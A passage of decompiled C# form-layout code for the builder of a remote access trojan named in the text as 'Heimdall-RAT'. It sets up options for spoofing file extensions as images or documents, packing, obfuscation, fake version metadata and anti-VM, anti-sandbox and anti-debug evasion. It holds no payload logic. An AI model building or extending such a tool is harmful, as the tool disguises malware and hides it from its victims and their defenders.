		size = new Size(67, 23);
		((Control)button8).set_Size(size);
		((Control)Button3).set_TabIndex(10);
		((ButtonBase)Button3).set_Text("Defaults");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((Control)GroupBox16).get_Controls().Add((Control)(object)pumpcb);
		((Control)GroupBox16).get_Controls().Add((Control)(object)Pumpv);
		((Control)GroupBox16).get_Controls().Add((Control)(object)pumpch);
		((Control)GroupBox16).get_Controls().Add((Control)(object)CBPRESS);
		((Control)GroupBox16).get_Controls().Add((Control)(object)CSPOOFER);
		((Control)GroupBox16).get_Controls().Add((Control)(object)CBSPOOF);
		GroupBox groupBox15 = GroupBox16;
		location = new Point(9, 385);
		((Control)groupBox15).set_Location(location);
		((Control)GroupBox16).set_Name("GroupBox16");
		GroupBox groupBox16 = GroupBox16;
		size = new Size(269, 67);
		((Control)groupBox16).set_Size(size);
		((Control)GroupBox16).set_TabIndex(9);
		GroupBox16.set_TabStop(false);
		GroupBox16.set_Text("Compile Settings");
		((ListControl)pumpcb).set_DisplayMember("1");
		pumpcb.set_DropDownStyle((ComboBoxStyle)2);
		((Control)pumpcb).set_Enabled(false);
		((Control)pumpcb).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)pumpcb).set_FormattingEnabled(true);
		pumpcb.get_Items().AddRange(new object[3] { "Kb", "Mb", "Gb" });
		ComboBox obj4 = pumpcb;
		location = new Point(214, 37);
		((Control)obj4).set_Location(location);
		((Control)pumpcb).set_Name("pumpcb");
		ComboBox obj5 = pumpcb;
		size = new Size(45, 21);
		((Control)obj5).set_Size(size);
		((Control)pumpcb).set_TabIndex(18);
		((Control)Pumpv).set_Enabled(false);
		((Control)Pumpv).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown pumpv = Pumpv;
		location = new Point(162, 38);
		((Control)pumpv).set_Location(location);
		NumericUpDown pumpv2 = Pumpv;
		num = new decimal(new int[4] { 1000, 0, 0, 0 });
		pumpv2.set_Maximum(num);
		NumericUpDown pumpv3 = Pumpv;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		pumpv3.set_Minimum(num);
		((Control)Pumpv).set_Name("Pumpv");
		NumericUpDown pumpv4 = Pumpv;
		size = new Size(49, 21);
		((Control)pumpv4).set_Size(size);
		((Control)Pumpv).set_TabIndex(17);
		NumericUpDown pumpv5 = Pumpv;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		pumpv5.set_Value(num);
		((ButtonBase)pumpch).set_AutoSize(true);
		((Control)pumpch).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox obj6 = pumpch;
		location = new Point(87, 41);
		((Control)obj6).set_Location(location);
		((Control)pumpch).set_Name("pumpch");
		CheckBox obj7 = pumpch;
		size = new Size(70, 17);
		((Control)obj7).set_Size(size);
		((Control)pumpch).set_TabIndex(16);
		((ButtonBase)pumpch).set_Text("Pumper");
		((ButtonBase)pumpch).set_UseVisualStyleBackColor(true);
		((ButtonBase)CBPRESS).set_AutoSize(true);
		((Control)CBPRESS).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox cBPRESS = CBPRESS;
		location = new Point(9, 41);
		((Control)cBPRESS).set_Location(location);
		((Control)CBPRESS).set_Name("CBPRESS");
		CheckBox cBPRESS2 = CBPRESS;
		size = new Size(73, 17);
		((Control)cBPRESS2).set_Size(size);
		((Control)CBPRESS).set_TabIndex(15);
		((ButtonBase)CBPRESS).set_Text("MPRESS");
		((ButtonBase)CBPRESS).set_UseVisualStyleBackColor(true);
		((ListControl)CSPOOFER).set_DisplayMember("1");
		CSPOOFER.set_DropDownStyle((ComboBoxStyle)2);
		((Control)CSPOOFER).set_Enabled(false);
		((Control)CSPOOFER).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)CSPOOFER).set_FormattingEnabled(true);
		CSPOOFER.get_Items().AddRange(new object[13]
		{
			".JPG", ".PNG", ".MP3", ".MP4", ".M3U", ".TXT", ".DOC", ".DOCX", ".ICO", ".PDF",
			".PPT", ".RAR", ".ZIP"
		});
		ComboBox cSPOOFER = CSPOOFER;
		location = new Point(145, 14);
		((Control)cSPOOFER).set_Location(location);
		((Control)CSPOOFER).set_Name("CSPOOFER");
		ComboBox cSPOOFER2 = CSPOOFER;
		size = new Size(115, 21);
		((Control)cSPOOFER2).set_Size(size);
		((Control)CSPOOFER).set_TabIndex(14);
		((ButtonBase)CBSPOOF).set_AutoSize(true);
		((Control)CBSPOOF).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox cBSPOOF = CBSPOOF;
		location = new Point(9, 18);
		((Control)cBSPOOF).set_Location(location);
		((Control)CBSPOOF).set_Name("CBSPOOF");
		CheckBox cBSPOOF2 = CBSPOOF;
		size = new Size(130, 17);
		((Control)cBSPOOF2).set_Size(size);
		((Control)CBSPOOF).set_TabIndex(1);
		((ButtonBase)CBSPOOF).set_Text("Extension Spoofer");
		((ButtonBase)CBSPOOF).set_UseVisualStyleBackColor(true);
		((Control)GroupBox5).get_Controls().Add((Control)(object)RDicon);
		((Control)GroupBox5).get_Controls().Add((Control)(object)RBnoicon);
		((Control)GroupBox5).get_Controls().Add((Control)(object)addicon);
		((Control)GroupBox5).get_Controls().Add((Control)(object)iconbox);
		((Control)GroupBox5).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1));
		GroupBox groupBox17 = GroupBox5;
		location = new Point(9, 15);
		((Control)groupBox17).set_Location(location);
		((Control)GroupBox5).set_Name("GroupBox5");
		GroupBox groupBox18 = GroupBox5;
		size = new Size(271, 82);
		((Control)groupBox18).set_Size(size);
		((Control)GroupBox5).set_TabIndex(8);
		GroupBox5.set_TabStop(false);
		GroupBox5.set_Text("Icon");
		((ButtonBase)RDicon).set_AutoSize(true);
		RadioButton rDicon = RDicon;
		location = new Point(8, 47);
		((Control)rDicon).set_Location(location);
		((Control)RDicon).set_Name("RDicon");
		RadioButton rDicon2 = RDicon;
		size = new Size(92, 19);
		((Control)rDicon2).set_Size(size);
		((Control)RDicon).set_TabIndex(10);
		((ButtonBase)RDicon).set_Text("Custom icon");
		((ButtonBase)RDicon).set_UseVisualStyleBackColor(true);
		((ButtonBase)RBnoicon).set_AutoSize(true);
		RBnoicon.set_Checked(true);
		RadioButton rBnoicon = RBnoicon;
		location = new Point(8, 22);
		((Control)rBnoicon).set_Location(location);
		((Control)RBnoicon).set_Name("RBnoicon");
		RadioButton rBnoicon2 = RBnoicon;
		size = new Size(67, 19);
		((Control)rBnoicon2).set_Size(size);
		((Control)RBnoicon).set_TabIndex(9);
		RBnoicon.set_TabStop(true);
		((ButtonBase)RBnoicon).set_Text("No icon");
		((ButtonBase)RBnoicon).set_UseVisualStyleBackColor(true);
		((Control)addicon).set_Enabled(false);
		Button obj8 = addicon;
		location = new Point(203, 34);
		((Control)obj8).set_Location(location);
		((Control)addicon).set_Name("addicon");
		Button obj9 = addicon;
		size = new Size(57, 23);
		((Control)obj9).set_Size(size);
		((Control)addicon).set_TabIndex(6);
		((ButtonBase)addicon).set_Text("Add");
		((ButtonBase)addicon).set_UseVisualStyleBackColor(true);
		iconbox.set_BorderStyle((BorderStyle)1);
		((Control)iconbox).set_Enabled(false);
		PictureBox obj10 = iconbox;
		location = new Point(123, 22);
		((Control)obj10).set_Location(location);
		((Control)iconbox).set_Name("iconbox");
		PictureBox obj11 = iconbox;
		size = new Size(56, 45);
		((Control)obj11).set_Size(size);
		iconbox.set_SizeMode((PictureBoxSizeMode)1);
		iconbox.set_TabIndex(5);
		iconbox.set_TabStop(false);
		((Control)GroupBox7).get_Controls().Add((Control)(object)GroupBox3);
		((Control)GroupBox7).get_Controls().Add((Control)(object)CBass);
		GroupBox groupBox19 = GroupBox7;
		location = new Point(9, 101);
		((Control)groupBox19).set_Location(location);
		((Control)GroupBox7).set_Name("GroupBox7");
		GroupBox groupBox20 = GroupBox7;
		size = new Size(271, 280);
		((Control)groupBox20).set_Size(size);
		((Control)GroupBox7).set_TabIndex(4);
		GroupBox7.set_TabStop(false);
		GroupBox7.set_Text("Assembly");
		((Control)GroupBox3).get_Controls().Add((Control)(object)Button5);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass8);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass7);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass6);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass5);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass4);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass3);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass2);
		((Control)GroupBox3).get_Controls().Add((Control)(object)ass1);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label17);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label16);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label15);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label14);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label13);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label12);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label11);
		((Control)GroupBox3).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox3).set_Enabled(false);
		GroupBox groupBox21 = GroupBox3;
		location = new Point(6, 43);
		((Control)groupBox21).set_Location(location);
		((Control)GroupBox3).set_Name("GroupBox3");
		GroupBox groupBox22 = GroupBox3;
		size = new Size(265, 231);
		((Control)groupBox22).set_Size(size);
		((Control)GroupBox3).set_TabIndex(2);
		GroupBox3.set_TabStop(false);
		Button button9 = Button5;
		location = new Point(154, 202);
		((Control)button9).set_Location(location);
		((Control)Button5).set_Name("Button5");
		Button button10 = Button5;
		size = new Size(108, 23);
		((Control)button10).set_Size(size);
		((Control)Button5).set_TabIndex(42);
		((ButtonBase)Button5).set_Text("Load From File");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(true);
		((Control)ass8).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj12 = ass8;
		location = new Point(80, 178);
		((Control)obj12).set_Location(location);
		((Control)ass8).set_Name("ass8");
		TextBox obj13 = ass8;
		size = new Size(182, 21);
		((Control)obj13).set_Size(size);
		((Control)ass8).set_TabIndex(40);
		ass8.set_Text("0.0.0.1");
		((Control)ass7).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj14 = ass7;
		location = new Point(80, 154);
		((Control)obj14).set_Location(location);
		((Control)ass7).set_Name("ass7");
		TextBox obj15 = ass7;
		size = new Size(182, 21);
		((Control)obj15).set_Size(size);
		((Control)ass7).set_TabIndex(38);
		ass7.set_Text("0.0.0.1");
		((Control)ass6).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj16 = ass6;
		location = new Point(80, 130);
		((Control)obj16).set_Location(location);
		((Control)ass6).set_Name("ass6");
		TextBox obj17 = ass6;
		size = new Size(182, 21);
		((Control)obj17).set_Size(size);
		((Control)ass6).set_TabIndex(36);
		ass6.set_Text("Heimdall-RAT");
		((Control)ass5).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj18 = ass5;
		location = new Point(80, 106);
		((Control)obj18).set_Location(location);
		((Control)ass5).set_Name("ass5");
		TextBox obj19 = ass5;
		size = new Size(182, 21);
		((Control)obj19).set_Size(size);
		((Control)ass5).set_TabIndex(34);
		ass5.set_Text("Copyright © Heimdall-RAT ");
		((Control)ass4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj20 = ass4;
		location = new Point(80, 82);
		((Control)obj20).set_Location(location);
		((Control)ass4).set_Name("ass4");
		TextBox obj21 = ass4;
		size = new Size(182, 21);
		((Control)obj21).set_Size(size);
		((Control)ass4).set_TabIndex(32);
		ass4.set_Text("Heimdall-RAT");
		((Control)ass3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj22 = ass3;
		location = new Point(80, 58);
		((Control)obj22).set_Location(location);
		((Control)ass3).set_Name("ass3");
		TextBox obj23 = ass3;
		size = new Size(182, 21);
		((Control)obj23).set_Size(size);
		((Control)ass3).set_TabIndex(30);
		ass3.set_Text("Heimdall-RAT");
		((Control)ass2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj24 = ass2;
		location = new Point(80, 36);
		((Control)obj24).set_Location(location);
		((Control)ass2).set_Name("ass2");
		TextBox obj25 = ass2;
		size = new Size(182, 21);
		((Control)obj25).set_Size(size);
		((Control)ass2).set_TabIndex(28);
		ass2.set_Text("Heimdall-RAT Client");
		((Control)ass1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj26 = ass1;
		location = new Point(80, 13);
		((Control)obj26).set_Location(location);
		((Control)ass1).set_Name("ass1");
		TextBox obj27 = ass1;
		size = new Size(182, 21);
		((Control)obj27).set_Size(size);
		((Control)ass1).set_TabIndex(26);
		ass1.set_Text("Heimdall-RAT");
		Label17.set_AutoSize(true);
		((Control)Label17).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label23 = Label17;
		location = new Point(2, 180);
		((Control)label23).set_Location(location);
		((Control)Label17).set_Name("Label17");
		Label label24 = Label17;
		size = new Size(81, 13);
		((Control)label24).set_Size(size);
		((Control)Label17).set_TabIndex(41);
		Label17.set_Text("File Version :");
		Label16.set_AutoSize(true);
		((Control)Label16).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label25 = Label16;
		location = new Point(2, 156);
		((Control)label25).set_Location(location);
		((Control)Label16).set_Name("Label16");
		Label label26 = Label16;
		size = new Size(58, 13);
		((Control)label26).set_Size(size);
		((Control)Label16).set_TabIndex(39);
		Label16.set_Text("Version :");
		Label15.set_AutoSize(true);
		((Control)Label15).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label27 = Label15;
		location = new Point(2, 132);
		((Control)label27).set_Location(location);
		((Control)Label15).set_Name("Label15");
		Label label28 = Label15;
		size = new Size(78, 13);
		((Control)label28).set_Size(size);
		((Control)Label15).set_TabIndex(37);
		Label15.set_Text("Trademark :");
		Label14.set_AutoSize(true);
		((Control)Label14).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label29 = Label14;
		location = new Point(2, 108);
		((Control)label29).set_Location(location);
		((Control)Label14).set_Name("Label14");
		Label label30 = Label14;
		size = new Size(72, 13);
		((Control)label30).set_Size(size);
		((Control)Label14).set_TabIndex(35);
		Label14.set_Text("Copyright :");
		Label13.set_AutoSize(true);
		((Control)Label13).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label31 = Label13;
		location = new Point(2, 84);
		((Control)label31).set_Location(location);
		((Control)Label13).set_Name("Label13");
		Label label32 = Label13;
		size = new Size(59, 13);
		((Control)label32).set_Size(size);
		((Control)Label13).set_TabIndex(33);
		Label13.set_Text("Product :");
		Label12.set_AutoSize(true);
		((Control)Label12).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label33 = Label12;
		location = new Point(2, 60);
		((Control)label33).set_Location(location);
		((Control)Label12).set_Name("Label12");
		Label label34 = Label12;
		size = new Size(71, 13);
		((Control)label34).set_Size(size);
		((Control)Label12).set_TabIndex(31);
		Label12.set_Text("Company :");
		Label11.set_AutoSize(true);
		((Control)Label11).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label35 = Label11;
		location = new Point(2, 38);
		((Control)label35).set_Location(location);
		((Control)Label11).set_Name("Label11");
		Label label36 = Label11;
		size = new Size(80, 13);
		((Control)label36).set_Size(size);
		((Control)Label11).set_TabIndex(29);
		Label11.set_Text("Description :");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label37 = Label3;
		location = new Point(2, 15);
		((Control)label37).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label38 = Label3;
		size = new Size(40, 13);
		((Control)label38).set_Size(size);
		((Control)Label3).set_TabIndex(27);
		Label3.set_Text("Title :");
		((ButtonBase)CBass).set_AutoSize(true);
		CheckBox cBass = CBass;
		location = new Point(6, 21);
		((Control)cBass).set_Location(location);
		((Control)CBass).set_Name("CBass");
		CheckBox cBass2 = CBass;
		size = new Size(110, 19);
		((Control)cBass2).set_Size(size);
		((Control)CBass).set_TabIndex(0);
		((ButtonBase)CBass).set_Text("Client Assembly");
		((ButtonBase)CBass).set_UseVisualStyleBackColor(true);
		((Control)GroupBox1).get_Controls().Add((Control)(object)GroupBox14);
		((Control)GroupBox1).get_Controls().Add((Control)(object)GroupBox8);
		((Control)GroupBox1).get_Controls().Add((Control)(object)GroupBox4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)GroupBox6);
		((Control)GroupBox1).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		GroupBox groupBox23 = GroupBox1;
		location = new Point(2, 4);
		((Control)groupBox23).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox24 = GroupBox1;
		size = new Size(290, 486);
		((Control)groupBox24).set_Size(size);
		((Control)GroupBox1).set_TabIndex(9);
		GroupBox1.set_TabStop(false);
		((Control)GroupBox14).get_Controls().Add((Control)(object)Label24);
		((Control)GroupBox14).get_Controls().Add((Control)(object)SBSLEEP);
		((Control)GroupBox14).get_Controls().Add((Control)(object)Label8);
		((Control)GroupBox14).get_Controls().Add((Control)(object)sleep);
		((Control)GroupBox14).get_Controls().Add((Control)(object)Label26);
		((Control)GroupBox14).get_Controls().Add((Control)(object)Label27);
		((Control)GroupBox14).get_Controls().Add((Control)(object)recdelay);
		GroupBox groupBox25 = GroupBox14;
		location = new Point(12, 238);
		((Control)groupBox25).set_Location(location);
		((Control)GroupBox14).set_Name("GroupBox14");
		GroupBox groupBox26 = GroupBox14;
		size = new Size(265, 70);
		((Control)groupBox26).set_Size(size);
		((Control)GroupBox14).set_TabIndex(5);
		GroupBox14.set_TabStop(false);
		GroupBox14.set_Text("Connectivity");
		Label24.set_AutoSize(true);
		((Control)Label24).set_Enabled(false);
		((Control)Label24).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label39 = Label24;
		location = new Point(176, 44);
		((Control)label39).set_Location(location);
		((Control)Label24).set_Name("Label24");
		Label label40 = Label24;
		size = new Size(76, 13);
		((Control)label40).set_Size(size);
		((Control)Label24).set_TabIndex(16);
		Label24.set_Text("milliseconds");
		((ButtonBase)SBSLEEP).set_AutoSize(true);
		CheckBox sBSLEEP = SBSLEEP;
		location = new Point(11, 43);
		((Control)sBSLEEP).set_Location(location);
		((Control)SBSLEEP).set_Name("SBSLEEP");
		CheckBox sBSLEEP2 = SBSLEEP;
		size = new Size(15, 14);
		((Control)sBSLEEP2).set_Size(size);
		((Control)SBSLEEP).set_TabIndex(13);
		((ButtonBase)SBSLEEP).set_UseVisualStyleBackColor(true);
		Label8.set_AutoSize(true);
		((Control)Label8).set_Enabled(false);
		((Control)Label8).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label41 = Label8;
		location = new Point(29, 43);
		((Control)label41).set_Location(location);
		((Control)Label8).set_Name("Label8");
		Label label42 = Label8;
		size = new Size(48, 13);
		((Control)label42).set_Size(size);
		((Control)Label8).set_TabIndex(15);
		Label8.set_Text("Sleep :");
		((Control)sleep).set_Enabled(false);
		((Control)sleep).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown obj28 = sleep;
		location = new Point(120, 40);
		((Control)obj28).set_Location(location);
		NumericUpDown obj29 = sleep;
		num = new decimal(new int[4] { 10000, 0, 0, 0 });
		obj29.set_Maximum(num);
		NumericUpDown obj30 = sleep;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		obj30.set_Minimum(num);
		((Control)sleep).set_Name("sleep");
		NumericUpDown obj31 = sleep;
		size = new Size(50, 21);
		((Control)obj31).set_Size(size);
		((Control)sleep).set_TabIndex(14);
		NumericUpDown obj32 = sleep;
		num = new decimal(new int[4] { 1500, 0, 0, 0 });
		obj32.set_Value(num);
		Label26.set_AutoSize(true);
		((Control)Label26).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label43 = Label26;
		location = new Point(176, 18);
		((Control)label43).set_Location(location);
		((Control)Label26).set_Name("Label26");
		Label label44 = Label26;
		size = new Size(76, 13);
		((Control)label44).set_Size(size);
		((Control)Label26).set_TabIndex(13);
		Label26.set_Text("milliseconds");
		Label27.set_AutoSize(true);
		((Control)Label27).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label45 = Label27;
		location = new Point(8, 18);
		((Control)label45).set_Location(location);
		((Control)Label27).set_Name("Label27");
		Label label46 = Label27;
		size = new Size(112, 13);
		((Control)label46).set_Size(size);
		((Control)Label27).set_TabIndex(12);
		Label27.set_Text("Reconnect Delay :");
		((Control)recdelay).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown obj33 = recdelay;
		location = new Point(120, 17);
		((Control)obj33).set_Location(location);
		NumericUpDown obj34 = recdelay;
		num = new decimal(new int[4] { 10000, 0, 0, 0 });
		obj34.set_Maximum(num);
		NumericUpDown obj35 = recdelay;
		num = new decimal(new int[4] { 100, 0, 0, 0 });
		obj35.set_Minimum(num);
		((Control)recdelay).set_Name("recdelay");
		NumericUpDown obj36 = recdelay;
		size = new Size(50, 21);
		((Control)obj36).set_Size(size);
		((Control)recdelay).set_TabIndex(11);
		NumericUpDown obj37 = recdelay;
		num = new decimal(new int[4] { 1500, 0, 0, 0 });
		obj37.set_Value(num);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ATAM);
		((Control)GroupBox8).get_Controls().Add((Control)(object)OPT);
		((Control)GroupBox8).get_Controls().Add((Control)(object)STEN);
		((Control)GroupBox8).get_Controls().Add((Control)(object)CBRAND);
		((Control)GroupBox8).get_Controls().Add((Control)(object)Obfu);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANIL);
		((Control)GroupBox8).get_Controls().Add((Control)(object)CBPROPRIO);
		((Control)GroupBox8).get_Controls().Add((Control)(object)CBHIDEE);
		((Control)GroupBox8).get_Controls().Add((Control)(object)CBPROPRI);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANTIE);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANTID);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANTIW);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANTISB);
		((Control)GroupBox8).get_Controls().Add((Control)(object)ANTIVM);
		GroupBox groupBox27 = GroupBox8;
		location = new Point(12, 312);
		((Control)groupBox27).set_Location(location);
		((Control)GroupBox8).set_Name("GroupBox8");
		GroupBox groupBox28 = GroupBox8;
		size = new Size(265, 168);
		((Control)groupBox28).set_Size(size);
		((Control)GroupBox8).set_TabIndex(4);
		GroupBox8.set_TabStop(false);
		GroupBox8.set_Text("Properties");
		((ButtonBase)ATAM).set_AutoSize(true);
		((Control)ATAM).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aTAM = ATAM;
		location = new Point(122, 96);
		((Control)aTAM).set_Location(location);
		((Control)ATAM).set_Name("ATAM");
		CheckBox aTAM2 = ATAM;
		size = new Size(112, 17);
		((Control)aTAM2).set_Size(size);
		((Control)ATAM).set_TabIndex(23);
		((ButtonBase)ATAM).set_Text("Anti Tampering");
		((ButtonBase)ATAM).set_UseVisualStyleBackColor(true);
		((ButtonBase)OPT).set_AutoSize(true);
		((Control)OPT).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox oPT = OPT;
		location = new Point(122, 114);
		((Control)oPT).set_Location(location);
		((Control)OPT).set_Name("OPT");
		CheckBox oPT2 = OPT;
		size = new Size(131, 17);
		((Control)oPT2).set_Size(size);
		((Control)OPT).set_TabIndex(22);
		((ButtonBase)OPT).set_Text("Obfuscate Public T");
		((ButtonBase)OPT).set_UseVisualStyleBackColor(true);
		((ButtonBase)STEN).set_AutoSize(true);
		((Control)STEN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox sTEN = STEN;
		location = new Point(122, 60);
		((Control)sTEN).set_Location(location);
		((Control)STEN).set_Name("STEN");
		CheckBox sTEN2 = STEN;
		size = new Size(124, 17);
		((Control)sTEN2).set_Size(size);
		((Control)STEN).set_TabIndex(21);
		((ButtonBase)STEN).set_Text("String Encryption");
		((ButtonBase)STEN).set_UseVisualStyleBackColor(true);
		((ButtonBase)CBRAND).set_AutoSize(true);
		((Control)CBRAND).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox cBRAND = CBRAND;
		location = new Point(122, 24);
		((Control)cBRAND).set_Location(location);
		((Control)CBRAND).set_Name("CBRAND");
		CheckBox cBRAND2 = CBRAND;
		size = new Size(133, 17);
		((Control)cBRAND2).set_Size(size);
		((Control)CBRAND).set_TabIndex(20);
		((ButtonBase)CBRAND).set_Text("Gen Namespace/C");
		((ButtonBase)CBRAND).set_UseVisualStyleBackColor(true);
		((ButtonBase)Obfu).set_AutoSize(true);
		((Control)Obfu).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox obfu = Obfu;
		location = new Point(122, 42);
		((Control)obfu).set_Location(location);
		((Control)Obfu).set_Name("Obfu");
		CheckBox obfu2 = Obfu;
		size = new Size(93, 17);
		((Control)obfu2).set_Size(size);
		((Control)Obfu).set_TabIndex(19);
		((ButtonBase)Obfu).set_Text("Obfuscation");
		((ButtonBase)Obfu).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANIL).set_AutoSize(true);
		((Control)ANIL).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNIL = ANIL;
		location = new Point(122, 78);
		((Control)aNIL).set_Location(location);
		((Control)ANIL).set_Name("ANIL");
		CheckBox aNIL2 = ANIL;
		size = new Size(97, 17);
		((Control)aNIL2).set_Size(size);
		((Control)ANIL).set_TabIndex(18);
		((ButtonBase)ANIL).set_Text("Anti ILDASM");
		((ButtonBase)ANIL).set_UseVisualStyleBackColor(true);
		((ListControl)CBPROPRIO).set_DisplayMember("1");
		CBPROPRIO.set_DropDownStyle((ComboBoxStyle)2);
		((Control)CBPROPRIO).set_Enabled(false);
		((Control)CBPROPRIO).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)CBPROPRIO).set_FormattingEnabled(true);
		CBPROPRIO.get_Items().AddRange(new object[5] { "Above Normal", "Below Normal", "Real Time", "High", "Idle" });
		ComboBox cBPROPRIO = CBPROPRIO;
		location = new Point(9, 133);
		((Control)cBPROPRIO).set_Location(location);
		((Control)CBPROPRIO).set_Name("CBPROPRIO");
		ComboBox cBPROPRIO2 = CBPROPRIO;
		size = new Size(108, 21);
		((Control)cBPROPRIO2).set_Size(size);
		((Control)CBPROPRIO).set_TabIndex(12);
		((ButtonBase)CBHIDEE).set_AutoSize(true);
		((Control)CBHIDEE).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox cBHIDEE = CBHIDEE;
		location = new Point(122, 132);
		((Control)cBHIDEE).set_Location(location);
		((Control)CBHIDEE).set_Name("CBHIDEE");
		CheckBox cBHIDEE2 = CBHIDEE;
		size = new Size(51, 17);
		((Control)cBHIDEE2).set_Size(size);
		((Control)CBHIDEE).set_TabIndex(6);
		((ButtonBase)CBHIDEE).set_Text("Hide");
		((ButtonBase)CBHIDEE).set_UseVisualStyleBackColor(true);
		((ButtonBase)CBPROPRI).set_AutoSize(true);
		((Control)CBPROPRI).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox cBPROPRI = CBPROPRI;
		location = new Point(9, 115);
		((Control)cBPROPRI).set_Location(location);
		((Control)CBPROPRI).set_Name("CBPROPRI");
		CheckBox cBPROPRI2 = CBPROPRI;
		size = new Size(115, 17);
		((Control)cBPROPRI2).set_Size(size);
		((Control)CBPROPRI).set_TabIndex(5);
		((ButtonBase)CBPROPRI).set_Text("Process Priority");
		((ButtonBase)CBPROPRI).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANTIE).set_AutoSize(true);
		((Control)ANTIE).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNTIE = ANTIE;
		location = new Point(9, 96);
		((Control)aNTIE).set_Location(location);
		((Control)ANTIE).set_Name("ANTIE");
		CheckBox aNTIE2 = ANTIE;
		size = new Size(108, 17);
		((Control)aNTIE2).set_Size(size);
		((Control)ANTIE).set_TabIndex(4);
